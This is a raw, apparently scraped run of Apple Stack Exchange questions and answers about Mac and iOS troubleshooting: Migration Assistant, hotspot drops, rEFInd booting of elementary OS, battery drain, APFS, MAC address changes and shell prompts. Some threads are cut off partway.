The target machine has a bigger SSD than the source, so I know it's not a space issue.\nI ran Migration Assistant on both machines and the process completely relatively quickly. After it completed I received about 2 dozen files that could not be transferred. The machine than boots into macOS and I start receiving repeated authorizations requests to repair files.\nI also receive notice that the keychain needs to be replaced with default.\nShould I attempt to boot the source into target disk mode and transfer via thunderbolt? \n\nA: It sounds like your Migration didn't work, even though you didn't get error messages saying so at the time.\nI always use either Target Mode or an external disk when I use Migration Assistant. I also don't do the Migration until I've gotten the new computer completely up-to-date, etc. I create an extra \"Admin\" or other dummy account which I delete later.\nI would reset the 2018 MBP, create a dummy account, do all the updates, and then when the system was running perfectly, then I'd start the Migration Assistant using the 2017 MBP in Target mode.\nThe other thing I do, because it didn't work correctly once when I did it a different way..... After selecting the source disk, MA will scan the source and identify the files, accounts, apps, etc. that need to be transferred. Since I was transferring everything, I didn't wait for it to calculate the sizes of all these different things, and just said \"Go\" or \"Next\" or whatever to get it started. That didn't work. So, now, I always wait for the scan of the source disk to complete. I wait to see the size of the Users folder, the size of the Apps folder, etc. before I start the Migration.\nGood luck!\n\nA: Finally...got it working. \nTLDR; I put the destination machine in target-disk mode, connected it with USB-C 3.1 Male-to-Male cable and used Carbon Copy Cloner to create a new sparsebundle on the root of the drive, than ran migration assistant after mounting it while running a dummy account. \nIt is worth noting I wanted to do a few things:\n\n\n*\n\n*Copy my machine as completely as possible (IE all my bash-profiles (I am a developer), and installed frameworks)\n\n*Have access to the source machine during the day for work! I don't think this is too much to ask in 2018 for a transfer of 500Gb to run over a LAN or USB-C 3.1 with all modern equipment)\n\n\nThere are A LOT of worthless \"Migration Assistant\" explanations out there. So I figured I'd post a few details of what I learned this week. This is my experience it may/probably won't work for everyone else. Plus I had the advantage of migrating 500Gb to 1TB which in the end was my saving grace.\nPaths I tried:\n\n\n*\n\n*Open Migration Assistant on both machines both connected to the same router (late model Linksys AC9000) network over CAT5 cables\nResult: Migration assistant runs, and transfers to new machine in 2-3 hours. However (same as initial question lots of \"Unable to transfer file\" errors, when logging in, no Docs, Applications in directories, etc., keychain warning). FAIL\n\n\n*Run Time Machine backup from source machine to external NAS (both connected over CAT5 to same Linksys AC9000 router). NAS is 12TB Symbology\nResult: Time Machine taking forever after 3-4 days I attempt to use lowpri_throttle_enabled hack, backups run faster, but keeps looping on \"Backing Up\" (Both Migration Assistant and Time Machine have USELESS \"progress indication\" FAIL - Gave up after backing up for 2-days\n\n\n*Go to Apple Store, and as employee: \"What does Apple use to migrate machines when customers ask it to be done for them?\" Answer: \"USB-C, it costs $99, and there is no timeframe, you leave us both computers and we call you when it's done.\"\nBuy generic Microcenter Inland brand \"Super Speed USB 3.1 10 Gbps\" USB-C Male to USB-C Male (Apple Store DOES NOT STOCK a USB-C 3.1 Male-to-Male cable as of this posting)\nConnect machines with cable, and put source in 'Target Disk Mode' (Hold \"T\" key while booting), open 'Migration Assistant' on destination machine.\nResult: Migration Assistant relatively quickly manages to collect source-information calculations (User Account, Application, Network Settings, etc. and sizes for each - though this does not seem to have much practical effect it takes A LONG TIME) Start migration, Migration assistant shows \"Starting Up\" for 3-hours, no change, or estimation or copy-speed indication. FAIL\n\n\n*Download Carbon Copy Cloner, I was suspicious of 3rd party back-up tools being capable of working appropriately with Apple's convoluted back-up scheme and sparse-bundle file format, but CCC 5 is definitely an excellent tool, so shameless plug to them! There is also a free-trial so you don't have to pay to use it full-featured for 30-days, but you should buy a license and save yourself the brain-damage of dealing with Time Machine.\nResult: Create new backup on NAS (Same Symbology 12TB NAS as before), since my Time Machine backup indefinitely never finished after 4-days. Wait (not as long as Time Machine) but overnight 4-5 hours over LAN CAT6 now. Open Migration Assistant on target machine, attach network drive, see my backup, and wait. \nMigration assistant says: \"Loading Backup\" for 12-14 hours, I cannot click \"Continue\" as it is deactivated. I can see network traffic moving from the NAS to the computer and so on, but after 15 hours I give up. FAIL\n\n\n*Put destination machine into target disk mode, and connect with USB-C 3.1 Male-to-Male cable to source. Format target drive, remember it has 1TB of space, and backup is only ~500Gb. Open Carbon Copy Cloner, and create new back-up on root of attached target-disk drive. This takes about 2-hours (relatively fast compared to other attempts). Attempt to boot into recovery (Discover machine just hangs at the Apple Spinning Globe screen, until I place backup sparsebundle inside of a directory on the root of the drive, I just call it backup/macbook-pro-2017.sparsebundle\nResult: I than reinstall MacOS, and create a dummy account (as suggested by @Zonker.in.Geneva) and than boot, run updates, verify that I still have my .sparsebundle archive, than I \"mount it\" (Double click it in Finder), and than open Migration Assistant.\nNow I see Macbook-Pro-2017 as a source, I select it, and it very quickly manages to do the size calculations. I start the migration once they complete, it's worth noting that as a developer I have A LOT of tiny files (it calculated 3.5 million in the sparsebundle), \nMigration takes ~12 hours. Again the time/progress indicators are WORTHLESS. Sometimes it says reading 130mb/s, sometimes nothing. Sometimes 3 days to finish, sometimes 3 hours. It's completely worthless. \nFinally, I reboot the machine and it says \"Migration Complete\" and magically, I am able to login to my account as if I was on the original machine, and it appears so far that everything is as expected.\nThe big caveat here is that I had a 1TB machine as a destination for ~500Gb worth of files, and after migration I only have about 50Gb of space left before I delete the sparsebundle. SUCCESS, now if I could only get the last week of time I spent messing around with this back.

If I go to Settings -> Wi-Fi then my iPad is not listed. \n\n*To make the hotspot reconnect I have to go back to my iPad and toggle the Personal HotSpot switch (On -> Off -> On).\n\n\nIs this by design or not?  Should the iPhone remain connected if the devices screen lock?\n\nA: Finally a working solution!\nTurn off Auto-Lock on your iPhone/iPad. If you set Auto-Lock to \"Never\", the Personal Hotspot will stay active. Even with screen locked for hours.\nNo more disconnects after 1 to 5 minutes.\n\nA: I think it's partially by design. Whenever my son wants to connect to my Personal hotspot, I have to open the Personal Hotspot screen, even if it's already on and he's got the network/password saved away. But, I don't have to toggle it off/on.\nAlso, disconnecting from a hotspot is automatic when the client device sleeps.\n\nA: After further experimentation I found that if I create a Bluetooth connection (pair) between iPhone/iPad it stays connected throughout screen locks etc.\n\nA: I had the same issue with 2 iPhones. It appeared that iOS 12 is saving power by disabling Hotspot broadcast then the signal disappears afterwards.\nTo fix this Go to iPhone setting -> 'Battery health' and disable the battery saving mode.\nYou find a small link under 'Peak Performance Capability', the option once disabled disappears and cannot be enabled again.\n\nA: I was annoyed by this battery-saving feature of iPhone tethering for over a year. What it normally does is to drop the connection when the traffic was not intensive enough, for example downloading a huge file vs. watching YouTube video with buffering.\nAfter searching around, I found the following methods that actually work!\n\n*\n\n*Tethering over a USB\n\n*Disable Auto-Lock, and leave the screen to the hotspot setting page.\n\n*Play Spotify in the background on PC (or whatever device that's using the hotspot).\n\n\nA: iPhone is trying to save battery when there is no data being transmitted to the connected device, for a given duration, by switch off the hotspot.

How many Megabytes does an iMessage use when sent over mobile data? I’m asking because I’m on a pay as you go plan and I want to send iMessages on mobile data. I want to know how much will it cost me?\n\nA: To answer your question as best as possible, lets look at the major points of where the data fluctuates. You didn't say if you had an SMS (Texting) plan with your carrier either, so if you do, just use that.\n\n\n*\n\n*Media messages with pictures/video will be considerably higher than a basic message.\n\n*A basic message is kilobytes in size and very small.\n\n*iMessage was developed as a free messaging service between Apple devices via Wifi networks which wouldn't count toward you texts per month/data plan. \nSo the answer to how much it will cost you is not available from the AskDifferent community without knowing how much you'll be using it and what for. \n\nA: Sending an iMessage involves two things:\n\n*\n\n*Sending the message payload (Text or data in the form of audio, video or image) to the Apple's iMessage server, and\n\n\n*The metadata exchanged between your device and Apple's iMessage server for the iMessage protocol (determining if the receiving party is registered with iMessage by contacting the Apple's servers, fetching the delivery and read status and time of iMessage etc.)\nThe metadata exchange takes up minuscule amount of data and the process is pretty optimised. The amount of data sent for audio, video and image equals the size of the asset (unless it is sent in compressed form). Emojis are sent in the form of textual code (unicode) and are not handled as image. Sending text does not involve a lot of data.\nThe iMessage service itself is made available by Apple free of cost. However, data charges for any data exchanged with the Apple servers over the Internet are applicable depending on the pricing plan for your mobile date as determined by the carrier.\nYou can determine the cellular data usage on a per app basis, as outlined by Apple in the support document, Check the cellular data usage on your iPhone and iPad:\n\nView how much data you're using\n\nTo see how much cellular data that you've used, go to Settings, then tap Cellular or Mobile Data. If you're using an iPad, you might see Settings > Cellular Data instead.\nTo see how much cellular data an app is using, scroll down to find the app. If you don't want an app to use cellular data, you can turn it off for that app. When cellular data is off, apps use Wi-Fi for data.\nTo see the cellular data usage for individual System Services, go to Settings, then tap Cellular or Mobile Data. Then scroll to the bottom of the screen and tap System Services. Cellular data can't be turned on or off for individual System Services.\nDepending on your carrier, you may see overall cellular data usage displayed on this screen. If you don’t have this option, or have questions about your data usage, contact your carrier.\n\nSince, the mobile data service cost vary across providers, you can use the guidelines mentioned above to get an idea about how much will it cost to send an iMessage.\nThus, the simple answer is:\nTotal cost = ( Total number of bytes transmitted + received in sending an iMessage ) multiplied by ( Mobile data cost per byte ).\ni.e. once you have determined the total data exchanged (sent + received) in sending an iMessage, you can get a precise idea about how much it will cost to send that iMessage over mobile data.\n", "Q: How to edit files on/copy to an NFTS external hard drive?

Probably it was not clean unmounted before.\"\nI've tried another external hard drive also formatted in NTFS and that works.\nI've tried one of the free solutions mentioned in the previous post - How do I write to NTFS drives in OS X?\n\nA: I have faced similar problem with my WD external 1 TB drive formatted as NTFS.\nFor writing, you'll need to install a proprietary NTFS driver for macOS called Paragon NTFS Driver for Mac.\nYou can follow the instructions on this support article on WD website, How to Install the Paragon NTFS Driver for Mac.\n", "Q: checking the status of an ongoing \"sleep\" process from the terminal Is there a way to check how long a running \"sleep\" process has left to go before it ends within the terminal?\n\nA: The sleep command in itself offers no service that allows the monitoring of the remaining sleep time. It is also not displayed anywhere.\nAs the sleep command operates without issuing a series of system calls for the kernel, you won't be able to use a typical debugging tool such as dtruss either. If you try to use the lldb debugger to attach to the process, you'll find that the sleep command is also interrupted and cannot be continued.\nSo it is not as such possible to very precisely determine the amount of time left. If you can make do with an imprecise result, do the following:\nFirst run this command:\nps xa | grep sleep\n\nThis should show you the sleep command with the number of seconds that it is supposed to sleep in total. For example:\n1234 s0123 S+    0:00.01 sleep 789\n\nHere 789 is the number of seconds that the command is supposed to sleep in total.\nThen afterwards run this command:\nps xa -o etime,command -c | grep sleep\n\nIt will show you the total time the process has been running:\n  03:15 sleep\n\nThis means that the process has sleep for 3 minutes and 15 seconds = 195 seconds. The remaining sleep time is 789 - 195 = 594 seconds.\n\nA: If your version of ps supports etimes (etime in seconds) (unfortunately not supported on MacOS), you can use this to calculate the remaining time:\nps xa -o etimes,command | awk '/[s]leep/ {print \"time remaining for\", $2, \"is\", $3 - $1, \"seconds\"}'\n\nExample output:\ntime remaining for sleep is 94 seconds\n\nOr you can simplify that to only show the number:\nps xa -o etimes,command | awk '/[s]leep/ {print $3 - $1}'\n\nThese commands will output more than one line if more than one sleep process is running.\nNote: Neither etime nor etimes outputs fractional seconds, but sleep can accept them as an argument. This will likely affect the accuracy of your calculation.\nFor MacOS and others without etimes, you can convert etime (ddd-hh:mm:ss) to seconds reversing the calculations done in the source of ps (in print.c):\nps xa -o etimes,command | awk '\n    BEGIN {\n        f = \"1 60 3600 86400\";\n        split(f, factors)\n    }\n    /[s]leep/ {\n        split($1, parts, \"[-:]\");\n        count = length(parts);\n        for (i = count; i > 0; i--) {\n            e += parts[i] * factors[count + 1 - i]\n        };\n        print e;\n        e = 0\n     }'\n\n", "Q: How do I get rid of \"weknow.ac\"?

This 1-star review was at one time a 5-star and managed to accumulate enough \"Helpful\" votes to land it's way to the top of the reviews for the app. In a stroke of what I see as bad luck, the owner of this top review changed their rating to 1-star. So now when you visit the app page, you see this 1-star review. I am now trying to figure out a way to remove it. Reporting it does not do anything.\nSo my question, if I reset the rating when I submit a new update, will it also reset the top \"Most Helpful\" reviews?\n\nA: I'm not sure about the rating of \"Most helpful\" reviews, but according to https://developer.apple.com/app-store/ratings-and-reviews/ it does not not reset your apps' written reviews.\n\nIn addition, keep in mind that resetting your summary rating does not\n  reset your app’s written reviews. Past reviews will continue to\n  display on your product page.\n\n", "Q: How to change carrier on iPad 2nd generation? I have a 2nd generation iPad which has both WiFi and Cellular connection. It is an iPad that I was using during a few years that I was living in Japan and has a Japanese phone company cellular connection.\nEven when the iPad was reset, this specific connection would show up in settings. How can I set up the iPad to use in United States, with a US cellular connection?\n\nA: If you check the Apple Sim page for iPad here (Use Apple SIM with Wi-Fi + Cellular models of iPad), it says that you can use a nano-SIM card in the SIM tray to set up a cellular data plan with a different carrier.\n\nJapan: \n  \n  \n*\n  \n*AU, DoCoMo, Softbank (purchased in a carrier retail location): The    embedded Apple SIM and nano-SIM tray are locked to the carrier that\n  sold you your iPad. Outside Japan, you can use the embedded Apple SIM \n  or a nano-SIM card in the SIM tray to set up a cellular data plan\n  with a different carrier if you are outside Japan..\n  \n*KDDI (KDDI retail locations): The embedded Apple SIM is locked to    KDDI in Japan. The nano-SIM tray is locked to the carrier that sold\n  you your iPad.

Computer boots normally into elementary OS, but boot menu (option key on boot) doesn't show anything I want to replace macOS with elementary OS on a Mac.\nI formated the entire hard disk, inserted the elementary OS bootable USB, selected EFI boot on the boot loader (only option) and installed elementary OS. Everything works well.\nThe computer boots normally into elementary OS, but if I press the option key on boot, nothing shows on the bootloader.\nIf I install, choose something else and create just the root and swap partition i get a Windows partion on the boot loader. This leads me to think that is something related to installing in the EFI mode.\nDoes anyone know what could be happening?\nAlso, why when I insert the live USB, I only get the EFI option and not the windows (bios mode) option when I press the option key?\nEdit:\nThe first method provided by David Anderson worked. \nI just want to add that i made a systemd service to clone the grubx64.efi on every reboot/shutdown so that even if this file gets updated, BOOTx64.EFI are updated as well. This will also automate the solution given by David.\nThis is what i did:\n1 - Create a file named startup-manager-fix.service with the following text:\n[Unit]\nDescription=Show EFI Install in Apple Startup Manager\nAfter=rc-local.service\n\n[Service]\nType=oneshot\nRemainAfterExit=true\nExecStop=-/bin/mkdir /boot/efi/EFI/BOOT/\nExecStop=/bin/cp -a -f /boot/efi/EFI/ubuntu/grubx64.efi /boot/efi/EFI/BOOT/BOOTx64.EFI\n\n[Install]\nWantedBy=multi-user.target\n\n2 - Copy the above file to the folder /etc/systemd/system/\n3 - Open the terminal and insert this command to activate the service that will sync both files.\nsudo systemctl daemon-reload && sudo systemctl enable startup-manager-fix.service && sudo systemctl start startup-manager-fix.service && sudo systemctl daemon-reload\n\n4 - reboot and the next time you access the apple boot selector (press the option key on startup) the elementary OS ( or other Ubuntu based distro) EFI Installation should be present.\nThanks again to David for the solution.\n\nA: \nNote: In the examples below, the download elementary OS installation was named elementaryos-0.4.1-stable.20180214.iso. The images were created using VirtualBox 5.2.16 r123759 (Qt5.6.3).\n\nWhy does nothing appear in the Startup Manager when installing for an EFI boot?\nAs you have discovered, Macs can be configured to boot operating systems that do not always appear in the Startup Manager. This can be corrected. Let us start with normal EFI booting install of the elementary OS. Right click on the icon labeled Files in the Applications menu, then select New Windows as Administrator, as shown below.\n\nUnder Devices, click on File System. You should get a window similar to what is shown below.\n\nNext, open the the following folders: boot, efi, EFI and finally ubuntu. You should get a window similar to what is shown below.\n\nWhen your Mac boots, the software stored in the grubx64.efi file is executed. Unfortunately, this file has a name and is stored in a folder that will not be recognized by the Startup Manager. Therefore, noting appears when you hold down the option at startup. One simple solution would be to \n\n\n*\n\n*Create a BOOT folder in the EFI folder.\n\n*Copy from the grubx64.efi file from the ubuntu folder to the BOOT folder.\n\n*Rename the grubx64.efi file in the BOOT folder to BOOTx64.EFI.\n\n\nThe image below shows the contents of the BOOT folder after having followed the above steps.\n\nFinally, follow the steps given below to insure the Mac boot loader executes the BOOTx64.EFI file.\n\n\n*\n\n*Restart your Mac and immediately press and hold the option key on your keyboard.\n\n*Release the option key when you see the Startup Manager window.\n\n*Hold down the control key while selecting the internal disk icon labeled EFI boot\nThe elementary OS will now appear in the Startup Manager as an internal drive icon with the label EFI boot.\nThe above solution has one problem: The elementary OS has no idea you made these changes. Therefore, any updates to the grubx64.efi file will not be automatically copied to the BOOTx64.EFI file. A better solution, that avoids this problem, is given below.\nFirst, use the Epiphany Web Browser to download the rEFInd Boot Manager. In my case, the file refind_0.11.3-1_amd64.deb was downloaded to my Downloads folder. When finished, quit the Epiphany application. \nNext, right click on the icon labeled Terminal in the Applications menu, then select New Window. You should get a window similar to what is shown below.\n\nIn the Terminal window, enter the following commands. If you downloaded a different file or downloaded to a different folder, then make the appropriate substitutions. When finished, quit the Terminal application.\ncd Downloads\nsudo dpkg -i refind_0.11.3-1_amd64.deb\n\nThe result, of running the above commands, was the creation of the refind and tools folders in the EFI folder, as shown below.\n\nNext, you will need to make the following modifications.\n\n\n*\n\n*If the BOOT folder does not exist, then create this folder. Otherwise, remove the contents of this folder.\n\n*Copy the contents from the refind folder to the BOOT folder.\n\n*Rename the refind_x64.efi file in the BOOT folder to BOOTx64.EFI.\n\n*Right click on the refind.conf file in the BOOT folder and then select Open in Scratch.\n\n*Add the following lines at the end of the opened refind.conf file.\n#\n# Added to make rEFInd silent. \n#\nmenuentry \"Elementary\" {\n    icon \\EFI\\BOOT\\icons\\os_elementary.png\n    volume \"EFI\"\n    loader \\EFI\\ubuntu\\grubx64.efi\n    ostype Linux\n    graphics on\n}\ntimeout -1\nhideui all\nscanfor manual\n\n\n*Close the refind.conf tab and quit the Scratch application.\nFinally, follow the steps given below to insure the Mac boot loader executes the BOOTx64.EFI file.\n\n\n*\n\n*Restart your Mac and immediately press and hold the option key on your keyboard.\n\n*Release the option key when you see the Startup Manager window.\n\n*Hold down the control key while selecting the internal disk icon labeled EFI boot\nNow, when you select the internal disk icon labeled EFI boot in the Startup Manager, rEFInd will silently boot elementary OS.\nWhy does an icon with the Windows label appear in the Startup Manager when installing for an BIOS boot?\nOrignially, when Apple first allowed Windows to be installed on Macs, Windows had to be installed for a BIOS boot. Therefore, Apple used Windows as the label displayed in the Boot Manager when any BIOS booting operating system was installed. This convention was repeated in all Macs until 2015, when Apple started shipping Macs that could no longer BIOS boot.\n", "Q: iPhone SE says \"connect to wi-fi or cellular to play music\" when I AM connected to cellular I can't figure this one out, and I don't often listen to music while out & about so I only just noticed it recently.\niPhone SE, iOS 11.3.  I have both Apple Music and iCloud Music Library subscriptions.\nIf my phone is connected on the Cellular network, I am unable to play certain songs on a smart playlist that is on my phone.  Anything from the \"For You\" or \"Browse\" tabs in Apple Music will work just fine, and SOME songs in the very same playlist, will also work fine.  But most will not play at all and simply say:\n\"Connect to wi-fi or cellular to play music\"\nObviously I AM connected to Cellular, so this is very confounding.  The songs in question are all in my iCloud Music Library, or Apple Music.  Some report an iCloud Status (in iTunes on my Mac) of \"Uploaded\", some \"Apple Music\".  There is no pattern that I can discern, all play fine on my Mac but it's completely hit or miss on my phone.\nAgain to be clear, some music will play just fine.  But some will not for no obvious reasons.  This means it is unrelated to needing to enable cellular data for Music, or anything like that (though I went through all those steps anyway just to be sure).\nSo far, I have:\n\n\n*\n\n*Rebooted the phone\n\n*Toggled every place there is to toggle related to using cellular data for music\n\n*Quit & relaunched the Music app\n\n*Googled and found nothing related to this exact issue\n\n\nI'm stumped.  I don't often listen to music in my car, but today was one of those days when I wanted to and... I couldn't listen to what I wanted to listen to.\n\nA: *\n\n*Update to iOS 12.1.2\n\n*Sign out of iTunes account (Mac iTunes app)\n\n*Sign in to your iTunes account\n\n*Connect your iPhone to your  (having iTunes app open)\n\n*Manage your songs and settings through iTunes\n\n\nI hope it helps. \n\nA: Look in Settings > iTunes and App Store. Is Cellular on? Look in Settings > Cellular. Is Music app enabled under Cellular Data?\n\nA: Might it have something to do with the size of the DJ mix / file? If higher bitrate = larger file regardless of the length of the mix? Is cellular streaming limited at all?\n", "Q: 2018 MacBook Pro experiencing very poor battery life (<4 hours) with light usage I bought a new 2018 15'' MacBook Pro with Touch Bar a couple weeks ago. So far its battery life has been abysmal, reaching 0% after less than 4 hours of very light usage (only web browsing).\nI decided to test the battery life today by having my regular applications (Safari, Firefox, and a few others) open and just letting the MBP sit on my desk. I should emphasize that there are absolutely no intensive programs running whatsoever; just a couple of web browsers and things like iMessage.\nRight off the bat, it tells me at 100% charge that I have 2:07 remaining.\nAround 20 minutes later, I checked again it is already down to 90% charge with 3:36 remaining.\nAnother 10 minutes later, it is down to 85% with 3:04 remaining.\nAfter 3 hours and 46 minutes, the battery level reached 0% and the machine went to forced sleep.\nConsidering that Apple's advertised battery life is 10 hours, I find it extremely perplexing that my MBP is getting less than 4 hours of battery life doing nothing except sit on my desk with a couple web browsers open in the background. During this test, there were just nine tabs open between the two browsers, and they contained only mundane sites like Wikipedia and Gmail.\nHas anyone else experienced issues with battery life on the 2018 MBPs? If you are getting close to the advertised 10 hours, what kind of activities are you doing?\nUPDATE:\nAfter further testing using gfxCardStatus, it appears that having a program using Java open in the background forces the graphics card to stay at the high performance discrete option. Is there any workaround for this? It is frustrating to have to close a bunch of applications every time I go out so that my battery lasts throughout the day.\n\nA: Considering your updated question that your problem is that running a Java-program forces the discrete GPU active thus draining your battery:\nThis is a known bug with some older versions of Java and JavaFX. Upgrade your Java to the latest version to see if that fixes this for you (see java bug JDK-8132775 and JDK-8041900).\nIf that still does not fix it, find the offending application and open its application bundle. Inside you'll find a Info.plist file, which you'll want to edit to add the key:\nNSSupportsAutomaticGraphicsSwitching\n\nthe key should be a boolean set to true.\nThis should fix the problem if the application uses a sufficiently new version of Java.\nIf you're not confident doing this, report the GPU behavior as a bug to app developer and hint them about NSSupportsAutomaticGraphicsSwitching. Hopefully they will put out an update fixing the problem.\nIf your Java program does not come as a .app but instead is a bare jar-file, you'll want to convert it to an app first. Use the jar2app script to convert it to an app, and then use the instructions above to add the NSSupportsAutomaticsGraphicsSwitching key.

Normally I avoid UI scripting to every extent possible but having been compelled to do so recently, I decided that playing around with this might help me understand it better. I did at least get a headache out of the effort. Anyway, I don't believe it is possible (at least with my v4) because the final UI element doesn't seem to have an associated action.\nBut as it's possible that a more recent version might have more functionality or that someone more proficient can identify how, here is a script that gets up to the colour palette.\nNB 'pop up button 4' is the 'Color' dropdown in the screen shot. The 'AXPress' action grabs the popup but doesn't present the palette. 'key code 76' simulates the 'return' key, bringing up the palette (pop over 1) but there are multiple alternatives. Also, if the palette is already showing, an error will result.\ntell application \"System Events\" to tell front window of application process \"Notability\"\n    tell pop up button 4 to perform action \"AXPress\"\n    key code 76\nend tell\n\nEither of these lines should 'click' the second colour (orange in the default palette) but do nothing in my version (each result is 'missing value').\nclick group 2 of list 1 of list 1 of pop over 1 of pop up button 4\ntell group 2 of list 1 of list 1 of pop over 1 of pop up button 4 to perform action \"AXPress\"\n\nIf you add this line it will generate some variation of the result below.

Many web pages claim that when you install 10.13 on an SSD, you have an option to convert to APFS.  Many others claim that when you install 10.13 on an SSD, you will be converted to APFS whether you want it or not.\nNeither was the case for me.  I have an internal SSD that upgraded to 10.13 and continued to the current 10.13.6.  Default disk utility knows it is SSD and HFS+ but will not convert it.  Recovery partition won't convert it either.  And in none of my upgrades was I ever offered the choice.\nI don't want to erase and do a multi-hour install, then have to do a multi-hour restore from backup.  Especially since I recently did (10.13.6) from recovery partition and it did not convert.\nOne page said you can't do it on your boot volume till 2017.  But 2017 is long gone.\nSSD was in this refurb when I bought it from the Boston Apple store January 2017.  I used Migration to put apps and accounts on it, Software Update since then.  Never used FileVault nor RAID nor Bootcamp.\nUPDATE: As detailed in the question and the \"half-answer,\" there was never an automatic update nor an offer to do so nor were any of my attempts to get around it successful as of August 2018.  I gave up on the idea at that point.  However, I noticed in disk utility today (13 Aug 2019) that my boot SSD is now APFS.  I have no idea when Apple did the conversion without asking, but it was after the updates to 10.13.0 through 10.13.6.

I know it comes up with PATH=/usr/bin:/bin:/usr/sbin:/sbin but none of those directories exist in recovery mode (they're all on the main volume).  I don't know whether redefining PATH is sufficient.  Some commands may need other environment variables to function.  (shared libraries, manpath, \nTempted to try it on the old machine that has a spinner instead of an SSD.\n\nA: It is possible from recovery mode and/or usb setup. Start the mac in recovery mode (hold cmd+R at boot). Open disk utility, select volume from the left click Edit and convert to APFS. If option is greyed out unmount the volume first from the toolbar.\n", "Q: EarPods are louder when put backwards into my ear My EarPods (wired EarPods) broke recently.\nNow if I put them in normally I can barely hear them, even at max volume.\nIf I cup my ears with my hands (with the EarPods in my ears in a normal position) then it's very loud again.\nIf I put the backs of the EarPods into my ears then it's loud, or upside down is also louder than the normal orientation.\nEvery other pair of EarPods I've tested work fine, it seems to be a problem with this specific pair.\nHow can I fix this problem?\nI assume the speakers have twisted inside of them (maybe not), is there a way I can safely and reversibly open the EarPods to put it back the right way round?\n\nA: Referring to the iFixit's Apple EarPods Teardown, it appears that it would be pretty hard to open up the ear drums, put the speakers right way round and assemble them back correctly.\n\nWith such a tight fit between the two halves of the EarPods, simply pulling them apart wasn't an option. We knew what we needed to do.\n\n\n\nThis isn't something you'd want to try at home. Once these Pods are open, they're not closing back up unless you want to involve glue.\n\nAdditionally, they are not rated well on serviceability or reparability front.\n\nBut unfortunately, these products are still of the throw-away kind. Sourcing parts is next to impossible, and it would be a tough sell to convince someone to take apart their earbuds instead of buying a new pair. They will never be the same once taken apart.\n\nIf you still have the original warranty for the iPhone with which the EarPods were bundled, you can try getting a replacement.\n", "Q: Is there any way to lock my mac without sleeping and without the screen saver activating? I want my Mac to stay awake on the login screen, but without activating the screen saver.\nI have tried a lot to no avail. I have tried to change Energy Saver settings, which only take effect when I'm logged in.\nAfter press Control + Command + Q, these settings no longer apply.\n\nA: You can disable the screen saver on the login window with this command in Terminal:\nsudo defaults write /Library/Preferences/com.apple.screensaver loginWindowIdleTime 0\n\nThe settings you have in \"Energy Saver Settings\" are only for the logged in user, whereas the login screen runs in a different context. To change the settings for the login window context, use the command above.\n", "Q: Activity monitor stops updating or intermittently updates Since I upgraded to High Sierra, the Activity Monitor has been relatively unusable for me. When I launch it, it updates for a while, but after a while (especially after a time of high CPU load), it plainly stops updating. I can interact with the application, but its displayed information doesn't update anymore.\nSwitching tabs sometimes seems to trigger one or two updates, but I still can't see current information.\nDoes anyone know why this happens and more importantly how I can solve it.\nNote: I compile a lot of C++, run some graphics intensive programs, sometimes with debugger attached, while having a VM standby in Parallels. I don't think this VM causes the issue as I've observed this behaviour without it being active. I did not see this type of behaviour before upgrading to High Sierra.\n\nA: I know of 2 options to help you. The first is to open Activity Monitor and click on View menu. The 3rd option on the menu is \"Update Frequency\". Clicking on \"Update Frequency\" gives you several options for how fast the screen is updating. Change that to a smaller number and see if that helps.\nThe second option is to use top or htop from the command. See how it looks. Activity Monitor is just a user interface for UNIX command top. By typing top on the command line, you are bypassing the user interface part.\n", "Q: Is it possible to add attachments to iCloud reminders? I can add links to the Notes field of Reminders - but I don't seem to be able to drag files into there. Is there a way to link to a PDF on iCloud Drive perhaps?\n\nA: As of today, it's not possible to add attachments to a Reminder in either macOS or iOS.\nI've read that some people have used 3rd-party apps (like Fantastical) to manage their reminders.  Doing that gives them additional features not found in Apple Reminders app.  I can't speak to that because I haven't tried those apps but you might want to look into that if this an important feature to you.\n", "Q: save a file to /usr using Mac's Save As dialogue I'm using OSX currently, but I usually use Windows. One thing that's really frustrating for me is that I can't figure out how to save a file to a very specific location (/usr/local/Cellar/apache-spark/2.3.1/conf/xyz.conf)\nWhen I click Save As in Sublime Text I get a save dialogue with only a few very limited choices (I assume this is a generic dialogue to Mac OS and not specific to Sublime). I learned to click the downward arrow next to the file name which expands the dialogue somewhat, but I still don't see how I can save the file in /usr since that folder is seemingly missing. Any idea?\nSee screenshot:\n\n\nA: It does indeed appear to be a regular save dialog, so once you've expanded it (the down-arrow next to 'Where' so you get a mini-finder view), the key combo ⌘ Command⇧ Shift. should toggle invisibles.\n(The same combo works in Finder proper, also)\n\nA: In standard Open and Save dialogs (and in the Finder), you can press Command-Shift-G and then enter the unix-style path to the folder you want (e.g. \"/usr/local/Cellar/apache-spark/2.3.1/conf\"). Note that tab-completion works here, so you don't actually have to type everything.\n\nA: If you expand the list of options one option should be your computer. Once you select your computer you should be able to save the file anywhere. You may not have permission to save in some directories though. Shown below is a connection to my computer.\n\n", "Q: How to auto paste above return value on command line I am trying to create a very simple script (.command) that \nwill basically change my mac address.. i do know that the command: openssl rand -hex 6 | sed 's/\\(..\\)/\\1:/g; s/.$//' will return me a random hex digits, now I want that when it will run this line sudo ifconfig en0 ether ## the hash tag will replace the random hex digits that it returned above.\nthank you,\nmendel\n\nA: I'm sure this isn't exactly the most elegant way to do this but the following will work:\nMAC=\"$( openssl rand -hex 6 | sed 's/\\(..\\)/\\1:/g; s/.$//' )\" && sudo ifconfig en0 ether $MAC\n\nThe above is how you could do that in a single command. It makes use of bash's variables. The first part assigns the vairable MAC to the output of your randomisation command then the second part inserts this output where you desire by referencing $MAC. If you're looking to integrate it into a bash script, you can modify it slightly like below; which does exactly the same thing just on multiple lines:\n#! /bin/bash\n\nMAC=\"$( openssl rand -hex 6 | sed 's/\\(..\\)/\\1:/g; s/.$//' )\" \n\nsudo ifconfig en0 ether $MAC\n\nHope that helps!\nKind regards, Tom\n", "Q: Why my MacBook Air terminal uses sh-3.2# instead of my username#? In my MacBook Air Terminal, I have the following prompt:\nZoos-MacBook-Air:~ zdm$\n\nWhen I type sudo su and then enter my root password, I usually get the same prompt with the # sign as follows:\nZoos-MacBook-Air:~ zdm#\n\nRecently I noticed that when I typed sudo su and then entered my root password, the prompt changed to:\nsh-3.2# \n\nHow to change it back to usual?\n\nA: I don't know why it changed, but you can override sh-3.2# or other default shell prompts by changing the $PS1 variable. To do that, simply run the following command (including the space after the dollar sign):\nexport PS1='\\h:\\w \\u\\$ '\n\nThis will replace your shell prompt with Zoos-MacBook-Air:~ root$. However, this change is not persistent and will be gone when you exit or close the Terminal. You can make it persistent by editing root's .bash_profile file. Run the following command while you are in a root shell to modify that file:\necho 'export PS1='\"'\"'\\h:\\w \\u\\$ '\"'\" >> 